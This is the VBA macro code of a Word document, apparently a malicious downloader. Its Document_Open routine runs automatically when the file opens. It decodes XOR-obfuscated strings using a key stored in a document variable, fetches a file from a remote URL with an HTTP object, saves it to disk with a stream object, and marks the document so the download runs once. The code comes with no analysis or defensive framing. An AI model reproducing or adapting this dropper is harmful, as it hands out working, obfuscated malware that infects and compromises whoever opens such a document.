Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer)
	Dim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA
	vSHOfSrEta = ActiveDocument.Variables("ppKzr").Value()
	gsFEVmmIzO = ""
	dHLdiEqdts = 1
	While dHLdiEqdts < UBound(HGKuttPaRM) + 2
		eUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta)
		gsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1)))
		dHLdiEqdts = dHLdiEqdts + 1
	Wend
	QklkhFEQNB = gsFEVmmIzO
End Function
Public Function BkAIuNwQNDkohBY()
	twOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _
	78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _
	12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _
	9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _
	2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _
	30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _
	62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _
	1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24)
	UkIWIEtqCF = QklkhFEQNB(Array(42, 115, 2), 188)
	Dim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0))
	Dim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176))
	xHttp.Open UkIWIEtqCF, twOvwCSTPL, False
	xHttp.Send
	With bStrm
		.Type = 1
		.Open
		.write xHttp.responseBody
		.savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2
	End With
	WScript.Echo (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))
End Function
Private Sub Document_Open()
	If ActiveDocument.Variables("ppKzr").Value <> "toto" Then
		BkAIuNwQNDkohBY
		ActiveDocument.Variables("ppKzr").Value = "toto"
		If ActiveDocument.ReadOnly = False Then
			ActiveDocument.Save
		End If
	End If
End Sub


